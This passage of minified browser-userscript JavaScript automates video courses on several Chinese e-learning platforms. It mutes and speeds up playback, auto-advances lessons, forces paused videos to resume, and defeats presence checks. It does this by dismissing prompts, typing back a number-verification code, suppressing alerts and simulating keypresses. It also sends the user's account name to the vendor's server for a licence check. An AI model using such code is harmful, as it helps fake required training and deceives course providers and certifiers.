            super(), this.taskLength = 0, this.currentIndex = -1, this.nodeListClass = e.nodeListClass, this.activeClass = e.activeClass || "", this.nextClass = e.nextClass || "", this.openListenPlayStatus = "boolean" != typeof e.openListenPlayStatus || e.openListenPlayStatus, this.openListenPlayTime = "boolean" == typeof e.openListenPlayTime && e.openListenPlayTime, this.apis = e.apis || {}, this.afterPlayEnd = e.afterPlayEnd, this.getCurrentIndexByOption = e.getCurrentIndexByOption, this.playNext = e.playNext || this.playNext, this.listenRebortFn = e.listenRebortFn, this.getVideoDom = "function" == typeof e.videoEle ? e.videoEle : this.getVideoDom, this.playFn = e.playFn, this.beforePlayVideo = e.beforePlayVideo, this.beforePlayNext = e.beforePlayNext, this.getCurrentIndex = e.getCurrentIndex ? e.getCurrentIndex.bind(this, this) : this.getCurrentIndex, e._init ? e._init(this) : this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(this.nodeListClass), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            if (this.getCurrentIndexByOption) this.currentIndex = await this.getCurrentIndexByOption(); else for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains(this.activeClass)) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 2e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelectorAll("video")[0], ElementObj.$video && (ElementObj.$video.src || ElementObj.$video.querySelector("source")) ? (clearInterval(l), e(1)) : 6 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.timer), clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            this.playFn ? await this.playFn(this) : (1 == e && (this.beforePlayVideo && "function" == typeof this.beforePlayVideo && await this.beforePlayVideo(this), ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.openListenPlayStatus && this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.openListenPlayTime && (await this.changeHtml(ElementObj.$video.parentElement), this.listenPlayTime()), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext(this)
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext(this)))
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                this.listenRebortFn && "function" == typeof this.listenRebortFn && this.listenRebortFn(this)
            }, 1e4)
        }

        async playNext() {
            if (this.beforePlayNext && "function" == typeof this.beforePlayNext && await this.beforePlayNext(this), !(this.currentIndex >= ElementObj.$allTask.length - 1)) {
                await sleep(2500), this.currentIndex += 1;
                let e = ElementObj.$allTask[this.currentIndex];
                (e = this.nextClass ? ElementObj.$allTask[this.currentIndex].querySelector(this.nextClass) : e)?.click(), this.afterPlayEnd && await this.afterPlayEnd(), setTimeout(() => {
                    this._o1()
                }, 5e3)
            }
        }

        listenPlayTime() {
            let l = 0;
            this.timer = setInterval(async () => {
                l += 1;
                var e = (ElementObj.$video?.currentTime / 60).toFixed(2), t = ElementObj.$video?.duration;
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t / 60}\u5206\u949f`)
            }, 5e3)
        }

        registerBtn(e, t, l) {
            MyTool.registerMenuCommand(e, t, l)
        }
    }

    function _ex(e) {
        for (var t = "", l = 0; l < e.length; l += 2) {
            var n = e.substr(l, 2), n = parseInt(n, 16);
            t += String.fromCharCode(n)
        }
        return t
    }

    class fujianshifan extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = 0, this.currentMidiaType = "video", this._init()
        }

        _init() {
            let n = document.querySelectorAll(".section");
            new Promise(l => {
                n.forEach((e, t) => {
                    e.childNodes[0].click(), sleep(20), t == n.length - 1 && l(!0)
                })
            }).then(e => {
                setTimeout(() => {
                    ElementObj.$allStudyTask = document.querySelectorAll(".section li"), this.getCurrentIndex()
                }, 2e3)
            })
        }

        getCurrentIndex() {
            let l = document.querySelector(".active").id;
            ElementObj.$allStudyTask.forEach((e, t) => {
                e.id == l && (this.currentIndex = t)
            })
        }

        play() {
            ElementObj.$allStudyTask[this.currentIndex].click(), setTimeout(() => {
                ElementObj.$video = document.querySelector("video"), ElementObj.$video ? (this.currentMidiaType = "video", this.handlePlayVideo()) : (this.currentMidiaType = "doc", this.handlePlayDoc())
            }, 2e3)
        }

        nextPlay() {
            sleep(1e3), this.currentIndex += 1, this._o1()
        }

        handlePlayVideo() {
            this.updateSpeedElement(toolOption.accelerator), ElementObj.$video.play(), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", ElementObj.$video.addEventListener("ended", () => {
                this.nextPlay()
            }, !1)
        }

        handlePlayDoc() {
            ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f";
            var e = document.querySelector("#lg-counter-all")?.innerHTML;
            let t = document.querySelector(".lg-actions>.lg-next"), l = Number(e), n = setInterval(() => {
                l <= 0 || !t ? (clearInterval(n), this.nextPlay()) : (t.click(), --l)
            }, 1e3)
        }
    }

    class gxcic extends Main {
        constructor() {
            super(), this.parentIndex = 0, this.currentIndex = 0, this.currentTaskEle = null, this.taskLength = 0, this.timer = null, this._init()
        }

        _init() {
            let e = setInterval(async () => {
                ElementObj.$allTaskParentNodes = document?.querySelectorAll(".ant-collapse-item"), ElementObj.$allTask = document?.querySelectorAll(".course-detail-content-section-info-text"), ElementObj.$allTask.length && ElementObj.$allTaskParentNodes.length && (clearInterval(e), this.getCurrentIndex())
            }, 1e3)
        }

        async getCurrentIndex() {
            ElementObj.$allTaskParentNodes.forEach((e, t) => {
                e.className.includes("ant-collapse-item-active") && (this.parentIndex = t)
            }), ElementObj.$allTask.forEach((e, t) => {
                e.className.includes("course-detail-current") && (this.currentIndex = t, this.currentTaskEle = e)
            }), this.currentTaskEle && showTip("\u521d\u59cb\u5316\u5b8c\u6210，\u53ef\u70b9\u51fb\u52a0\u901f")
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), e(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.timer), await this.getVideoDom(), ElementObj.$video.play(), this.updateSpeedElement(toolOption.accelerator), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.lisRebort(), ElementObj.$video.addEventListener("ended", async () => {
                var e = this.currentTaskEle.parentElement.parentElement.nextSibling;
                e ? (this.currentIndex += 1, this.currentTaskEle = e) : (this.parentIndex += 1, this.currentIndex += 1, ElementObj.$allTaskParentNodes[this.parentIndex].lastChild.firstChild.firstChild.click(), await sleep(1500), ElementObj.$allTask = document?.querySelectorAll(".course-detail-content-section-info-text"), this.currentTaskEle = ElementObj.$allTask[this.currentIndex]), this.currentTaskEle.click(), await sleep(5e3), this._o1()
            }, !1), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.play()
                }, 1500)
            })
        }

        lisRebort() {
            this.timer = setInterval(() => {
                document.querySelector(".sdk-ia-message-confirm")?.click();
                var e = document.querySelector(".sdk-ia-number-verify-image");
                e && (document.querySelector(".sdk-ia-number-input input").value = e.innerText, document.querySelector(".sdk-ia-number-button").click())
            }, 5e3)
        }
    }

    class fjsf2 extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = 0, this.currentIndex = 0, this.currentMidiaType = "video", this._init()
        }

        _init() {
            ElementObj.$allTaskParentNodes = document?.querySelectorAll(".section");
            document.querySelectorAll(".section");
            this.getCurrentIndex()
        }

        getCurrentIndex() {
            ElementObj.$allTaskParentNodes.forEach((e, l) => {
                let n = e.querySelectorAll("li");
                n?.forEach((e, t) => {
                    e.className.includes("active") && (this.parentIndex = l, this.currentIndex = t, ElementObj.$allTask = n)
                })
            })
        }

        async play() {
            ElementObj.$allTask[this.currentIndex].click(), await sleep(2e3), document.querySelector(".lg-close") ? (this.currentMidiaType = "doc", this.handlePlayDoc()) : (this.currentMidiaType = "video", this.handlePlayVideo())
        }

        async nextPlay() {
            if (await sleep(1e3), this.currentIndex >= ElementObj.$allTask.length - 1) {
                if (this.parentIndex += 1, this.currentIndex = 0, this.parentIndex >= ElementObj.$allTaskParentNodes.length) return void alert("\u5df2\u5168\u90e8\u64ad\u653e\u5b8c");
                var e = ElementObj.$allTaskParentNodes[this.parentIndex].querySelectorAll("li");
                e.length ? ElementObj.$allTask = e : (ElementObj.$allTaskParentNodes[this.parentIndex].childNodes[0].click(), await sleep(300), ElementObj.$allTask = ElementObj.$allTaskParentNodes[this.parentIndex].querySelectorAll("li"))
            } else this.currentIndex += 1;
            this._o1()
        }

        handlePlayVideo() {
            ElementObj.$video = document.querySelector("video"), this.updateSpeedElement(toolOption.accelerator), ElementObj.$video.play(), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", ElementObj.$video.addEventListener("ended", () => {
                this.nextPlay()
            }, !1)
        }

        async handlePlayDoc() {
            ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", await sleep(1500);
            var e = document.querySelector(".lg-toggle-thumb");
            e && (e.click(), document.querySelectorAll(".lg-thumb-item").length), await sleep(2e3), document.querySelector(".lg-close").click(), this.nextPlay()
        }
    }

    class zjzx extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = 0, this._init()
        }

        _init() {
            ElementObj.$allTask = document.querySelectorAll(".nLi"), this.getCurrentIndex()
        }

        getCurrentIndex() {
            ElementObj.$allTask.forEach((e, t) => {
                e.querySelector("li").classList.contains("active") && (this.currentIndex = t)
            })
        }

        async play() {
            ElementObj.$video = document.querySelector("video"), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", ElementObj.$video.addEventListener("ended", () => {
                setTimeout(() => {
                    this._o1()
                }, 5e3)
            })
        }
    }

    class zxpxmr extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = 0, this._init()
        }

        _init() {
            window.alert = function () {
                return !1
            };
            let e = setInterval(() => {
                ElementObj.$allTask = document.querySelectorAll(".kecheng_play_mian_list_item"), ElementObj.$allTask.length && (showTip("🔉\u521d\u59cb\u5316\u5b8c\u6210，\u53ef\u70b9\u51fb\u52a0\u901f", 3e3), clearInterval(e), this.getCurrentIndex())
            }, 1e3)
        }

        getCurrentIndex() {
            ElementObj.$allTask.forEach((e, t) => {
                e.classList.contains("kecheng_play_mian_list_item_progress_playing") && (this.currentIndex = t)
            })
        }

        async play() {
            ElementObj.$video = document.querySelector("video"), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$video.play(), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.simulationClick(), ElementObj.$video.addEventListener("ended", async () => {
                var e;
                clearInterval(this.timer), this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u8bfe\u7a0b\u5df2\u5168\u90e8\u90e8\u5206\u5b8c") : (this.currentIndex += 1, e = document.querySelector("#btn-sure"), await sleep(2e3), e?.click(), setTimeout(() => {
                    this._o1()
                }, 5e3))
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.play()
                }, 1e3)
            })
        }

        simulationClick() {
            var e = new KeyboardEvent("keydown", {keyCode: 8, which: 8});
            this.timer = setInterval(() => {
                try {
                    document.dispatchEvent(e)
                } catch (e) {
                }
            }, 3e3)
        }
    }

    class ggfw extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = 0, this._init()
        }

        _init() {
            ElementObj.$parentNodes = document.querySelectorAll(".learnList"), ElementObj.$parentNodes.length && this.selectOneClass(), new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$allTask = document.querySelectorAll(".courseItem"), ElementObj.$allTask.length && (clearInterval(t), this.getCurrentIndex(), e(!0))
                }, 1e3)
            }).then(e => {
                ElementObj.$handleSpeedUp.style.display = "none";
                let t = setInterval(async () => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.setAttribute("autoplay", "autoplay");
                    var e = document.querySelector(".volume-icon");
                    e.click(), await sleep(500), e.click(), ElementObj.$video && (clearInterval(t), showTip("🔉\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u81ea\u52a8\u64ad\u653e", 3e3), await sleep(300), document.querySelector(".prism-big-play-btn").click(), await this._o1())
                }, 1e3)
            })
        }

        getCurrentIndex() {
            ElementObj.$allTask.forEach((e, t) => {
                e.classList.contains("active") && (this.currentIndex = t)
            })
        }

        async play() {
            await sleep(3e3), localStorage.setItem("ctx-status", ""), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f"
            }, 1500), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                clearInterval(this.timer), ElementObj.$allTask = document.querySelectorAll(".courseItem"), await sleep(300), this.currentIndex >= ElementObj.$allTask.length - 1 ? (localStorage.setItem("ctx-status", "done"), document.querySelector(".sc-box").click(), await sleep(1500), document.querySelectorAll(".menu-box ul li")[3].click(), await sleep(2e3), window.location.reload()) : (this.currentIndex += 1, this._o1(), await sleep(2500), ElementObj.$allTask[this.currentIndex].click())
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.play()
                }, 1e3)
            })
        }

        selectOneClass() {
            let e = setTimeout(async () => {
                clearInterval(e), document.querySelector("#tab-second").click(), await sleep(2500), ElementObj.$parentNodes = document.querySelectorAll(".course_item"), await sleep(200), ElementObj.$parentNodes[0].click()
            }, 3e3)
        }
    }

    class mingshiclass extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = 0, this.parentIndex = -1, this._init()
        }

        _init() {
            document.querySelector(".title-box .setMealName") ? this.selectOneClass() : this.initPlayPage()
        }

        initPlayPage() {
            new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$allTask = document.querySelectorAll(".course-list .course-item"), ElementObj.$allTask.length && (clearInterval(t), this.getCurrentIndex(), e(!0))
                }, 1e3)
            }).then(e => new Promise(async e => {
                ElementObj.$video = document.querySelector("video"), await sleep(3e3), ElementObj.$video && (showTip("🔉\u521d\u59cb\u5316\u5b8c\u6210，\u64ad\u653e\u5f00\u59cb", 3e3), e(!0))
            })).then(e => {
                this._o1()
            })
        }

        getCurrentIndex() {
            ElementObj.$allTask.forEach((e, t) => {
                e.querySelector(".course-name").classList.contains("play-status") && (this.currentIndex = t)
            })
        }

        async play() {
            ElementObj.$video = document.querySelector("video"), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.setAttribute("autoplay", "autoplay"), ElementObj.$video.volume = 0, await sleep(3500), document.querySelector(".play_btn").click(), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", ElementObj.$video.addEventListener("ended", async () => {
                var e;
                this.currentIndex >= ElementObj.$allTask.length - 1 ? (e = document.querySelector(".back-img"), sleep(200), e.click(), setTimeout(() => {
                    location.reload()
                }, 3e3)) : (this.currentIndex += 1, e = ElementObj.$allTask[this.currentIndex], await sleep(5e3), e?.click(), setTimeout(() => {
                    this._o1()
                }, 2e3))
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.play()
                }, 3e3)
            })
        }

        selectOneClass() {
            let e = setTimeout(async () => {
                clearInterval(e), ElementObj.$parentNodes = document.querySelectorAll(".content-box>.course-list>div"), await sleep(200), ElementObj.$parentNodes.forEach((e, t) => {
                    if ("\u672a\u5b8c\u6210" == e.querySelector(".course_item_brief").lastChild.innerText && -1 == this.parentIndex) return this.parentIndex = t, !0
                }), await sleep(200), ElementObj.$parentNodes[this.parentIndex].click(), setTimeout(() => {
                    this.initPlayPage()
                }, 2500)
            }, 1e3)
        }
    }

    mingshiclass.ctxid = 17;

    class qiangshi extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this.listenRebortTime = null, this._init()
        }

        _init() {
            try {
                var e = document.querySelectorAll("iframe")[2].contentWindow.document.querySelectorAll("iframe")[0].contentWindow;
                this._document = e.document
            } catch (e) {
            }
            let l = setInterval(() => {
                try {
                    var e = document.querySelector("iframe.contentIframe").contentWindow;
                    if (ElementObj.$allTask = e.document.querySelectorAll(".s_point"), ElementObj.$allTask.length) {
                        clearInterval(l);
                        for (let e = 0; e < ElementObj.$allTask.length; e++) {
                            var t = ElementObj.$allTask[e];
                            -1 < t.innerText.indexOf("\u8ba8\u8bba") || t.querySelector(".item_done_icon").classList.contains("done_icon_show") || -1 != this.currentIndex || (this.currentIndex = e)
                        }
                        -1 == this.currentIndex ? alert("\u5f53\u524d\u7ae0\u8282\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c") : (showTip("⚠️⚠️⚠️\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                            this._o1()
                        }, 4500), ElementObj.$handleSpeedUp.style.display = "none")
                    }
                } catch (e) {
                }
            }, 1e3)
        }

        getVideoDom() {
            return new Promise(t => {
                let l = 7, n = setInterval(() => {
                    try {
                        l <= 0 && (clearInterval(n), t(2)), --l;
                        var e = document.querySelectorAll("iframe")[2].contentDocument.querySelectorAll("iframe")[0].contentDocument;
                        ElementObj.$video = e?.querySelector("video"), ElementObj.$video && (clearInterval(n), t(1))
                    } catch (e) {
                    }
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenRebortTime), ElementObj.$allTask[this.currentIndex].click();
            var e = await this.getVideoDom();
            this.listenRebort(), 1 == e && (ElementObj.$video.volume = 0, this._document.querySelector("#player_pause")?.click(), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = localStorage.getItem("_localSpeed") || toolOption.accelerator
            }, 2e3), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play(), ElementObj.$video.playbackRate = localStorage.getItem("_localSpeed") || toolOption.accelerator
                }, 1500)
            })), 2 == e && (showTip("⚠️⚠️⚠️\u5f53\u524d\u8bfe\u7a0b\u672a\u53d1\u73b0\u89c6\u9891，\u5c06\u81ea\u52a8\u8fdb\u884c\u4e0b\u4e00\u8282", 2e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                let e = document.querySelector(".layui-layer-btn0");
                e && setTimeout(() => {
                    e.click(), ElementObj.$video.play()
                }, 3e3)
            }, 1e4)
        }

        playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u8bfe\u7a0b\u5df2\u5168\u90e8\u90e8\u5206\u5b8c") : (this.currentIndex += 1, showTip("⚠️⚠️⚠️\u6b63\u5728\u5207\u6362\u8bfe\u7a0b", 3500), ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 3500))
        }
    }

    qiangshi.ctxid = 18;

    class lanzhgoulgjs extends Main {
        constructor() {
            super(), this.taskLength = 0, this.page_new = !1, this.currentIndex = -1, this._init()
        }

        _init() {
            let i = setInterval(async () => {
                var e = document.querySelectorAll(".chapterlist .drop p"),
                    t = document.querySelectorAll(".chapterlist .videoList p"),
                    e = ((e.length || t.length) && (clearInterval(i), ElementObj.$allTask = e.length ? e : t, this.getCurrentIndex()), document.querySelectorAll(".Play_video_title_item__IBQLd"));
                if (e.length) {
                    clearInterval(i), this.page_new = !0;
                    for (var l of e) l.nextSibling || l.click();
                    await MyTool.sleep(1e3), ElementObj.$allTask = Array.from(document.querySelectorAll(".Play_child_item__4L1N4"));
                    var n = Array.from(document.querySelectorAll(".Play_child_item__4L1N4")).map(e => e.querySelector(".arco-progress-circle-text") ? e.querySelector(".arco-progress-circle-text").innerText : -1);
                    this.page_new = !0;
                    for (let e = 0; e < n.length; e++) if (-1 != n[e] && parseInt(n[e]) < 99) {
                        ElementObj.$allTask[e].click(), this.currentIndex = e, ElementObj.$handleSpeedUp.style.display = "none", showTip("🔉🔉🔉\u521d\u59cb\u5316\u5b8c\u6210，5s\u540e\u5f00\u59cb\u64ad\u653e", 3e3), this.pdPlayFn(location.href);
                        break
                    }
                }
                if (ElementObj.$allTask = document.querySelectorAll(".Play_child_item__4L1N4"), !e.length && ElementObj.$allTask.length) {
                    clearInterval(i);
                    var a = Array.from(document.querySelectorAll(".Play_child_item__4L1N4")).map(e => e.querySelector(".arco-progress-circle-text") ? e.querySelector(".arco-progress-circle-text").innerText : -1);
                    this.page_new = !0;
                    for (let e = 0; e < a.length; e++) if (-1 != a[e] && parseInt(a[e]) < 99) {
                        ElementObj.$allTask[e].click(), this.currentIndex = e, ElementObj.$handleSpeedUp.style.display = "none", showTip("🔉🔉🔉\u521d\u59cb\u5316\u5b8c\u6210，5s\u540e\u5f00\u59cb\u64ad\u653e", 3e3), this.pdPlayFn(location.href);
                        break
                    }
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            let l = [];
            ElementObj.$allTask.forEach((e, t) => {
                var e = e.querySelector(".class_percent");
                e ? (e = e.innerText, l.push(parseInt(e))) : l.push(0)
            }), l.reverse();
            for (var e = 0; e <= l.length - 1; e++) if (l[e] < 98) {
                this.currentIndex = l.length - e - 1;
                break
            }
            if (0 == this.currentIndex) {
                ElementObj.$allTask[1].querySelector("a").click(), await sleep(4e3), ElementObj.$allTask = document.querySelectorAll(".chapterlist .drop p"), await sleep(200);
                var t = ElementObj.$allTask[0].querySelector(".class_percent").innerText;
                if (!(parseInt(t) < 98)) return void alert("\u5f53\u524d\u79d1\u76ee\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c");
                this.currentIndex = 0
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u79d1\u76ee\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c") : (ElementObj.$handleSpeedUp.style.display = "none", showTip("🔉🔉🔉\u521d\u59cb\u5316\u5b8c\u6210，5s\u540e\u5f00\u59cb\u64ad\u653e", 3e3), this.pdPlayFn(location.href))
        }

        getVideoDom() {
            return new Promise(async l => {
                var e = document.querySelector(".Header_userCenter__UFh5G")?.innerText;
                if (e) {
                    e = await MyTool.axfedata({
                        url: _b + "/order/checkUseAccount?toolkey=" + MyTool.getValue("mytoolkey") + "&account=" + e + "&type=2",
                        method: "GET"
                    });
                    if (200 !== e.code) return alert(e.message)
                }
                let n = setInterval(() => {
                    ElementObj.$video = document.querySelector("video");
                    var e = ElementObj.$video.src, t = document.querySelector("iframe");
                    e && (clearInterval(n), l(1)), t && (clearInterval(n), l(2))
                }, 1e3)
            })
        }

        async play() {
            var e, t;
            this.page_new ? (await this.getVideoDom(), ElementObj.$video.volume = 0, ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator, this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                location.reload()
            })) : (e = ElementObj.$allTask[this.currentIndex].querySelector("a"), await sleep(300), e.click(), await sleep(3e3), 1 == (e = await this.getVideoDom()) && (clearInterval(this.listenVidoeStatusTimer), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), t = document.querySelector(".ckplayer-ckplayer"), this.changeHtml(t), this.reloadPage(), this.listenPageHide(), this.listenAbnormal(1), ElementObj.$video.addEventListener("ended", async () => {
                location.reload()
            })), 2 == e && (t = document.querySelector("#thirdplayer"), this.changeHtml(t), this.reloadPage(), this.listenPageHide(), this.listenAbnormal(0)))
        }

        async reloadPage() {
            let e = 180, t = setInterval(() => {
                e <= 0 && (clearInterval(t), location.reload()), --e
            }, 1e3)
        }

        listenAbnormal(t) {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let l = 0;
            setInterval(() => {
                l += 1, 0 == t ? this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60`) : (e = (ElementObj.$video.currentTime / 60).toFixed(2), this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f`));
                var e = document.querySelector(".layui-layer-btn0");
                e && location.reload()
            }, 5e3)
        }

        async changeHtml(e) {
            var t = document.createElement("div");
            t.setAttribute("class", "ctxstatsbox"), t.setAttribute("style", `
                width: 796px;
                height: 545px;
                background: #eae9e9;
                position: absolute;
                z-index: 10;
                overflow: scroll;
                top: 0;
                padding-left: 10px;
            `), e.appendChild(t), await sleep(300), ElementObj.$ctxstatsbox = document.querySelector(".ctxstatsbox"), this.addInfo("🔉\u521d\u59cb\u5316\u5df2\u5b8c\u6210，\u6b63\u5728\u64ad\u653e"), this.addInfo("⚠️⚠️⚠️\u8bfe\u7a0b\u91c7\u7528\u5012\u7740\u64ad\u653e，\u8bf7\u52ff\u624b\u52a8\u66f4\u6362\u8bfe\u7a0b", 0)
        }

        addInfo(e, t) {
            15 <= document.querySelectorAll(".ctxstatsbox_li").length && (ElementObj.$ctxstatsbox.innerHTML = "");
            t = `<li class="ctxstatsbox_li" style="color: ${0 == t ? "#f01414" : "#000"};line-height: 30px;font-size: 16px;">${e}</li>`;
            ElementObj.$ctxstatsbox.innerHTML += t
        }

        listenPageHide() {
            let t;
            document.addEventListener("visibilitychange", () => {
                if (document.hidden) {
                    let e = 0;
                    t = setInterval(() => {
                        5 <= (e += 1) && this.addInfo("⚠️⚠️⚠️\u8bf7\u52ff\u957f\u65f6\u95f4\u9690\u85cf\u8be5\u5b66\u4e60\u9875\u9762", 0)
                    }, 5e3)
                } else clearInterval(t)
            })
        }
    }

    class lanzhouwenli extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this._init()
        }

        _init() {
            let e = setInterval(() => {
                ElementObj.$allTask = document.querySelectorAll(".video"), ElementObj.$allTask.length && (clearInterval(e), this.getCurrentIndex())
            }, 1e3)
        }

        async getParentIndex() {
        }

        async getCurrentIndex() {
            ElementObj.$allTask.forEach((e, t) => {
                e = e.querySelector(".el-progress__text").innerText;
                parseInt(e) < 96 && -1 == this.currentIndex && (this.currentIndex = t)
            }), -1 == this.currentIndex ? alert("\u5f53\u524d\u7ae0\u8282\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c") : (showTip("🔉🔉🔉\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u5f00\u59cb\u64ad\u653e", 3e3), await sleep(2e3), ElementObj.$allTask[this.currentIndex].click(), await sleep(2500), this._o1())
        }

        async play() {
            await this.getVideoDom(), document.querySelector(".volume-icon").classList.add("mute"), ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$video.play(), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", ElementObj.$video.addEventListener("ended", async () => {
                var e;
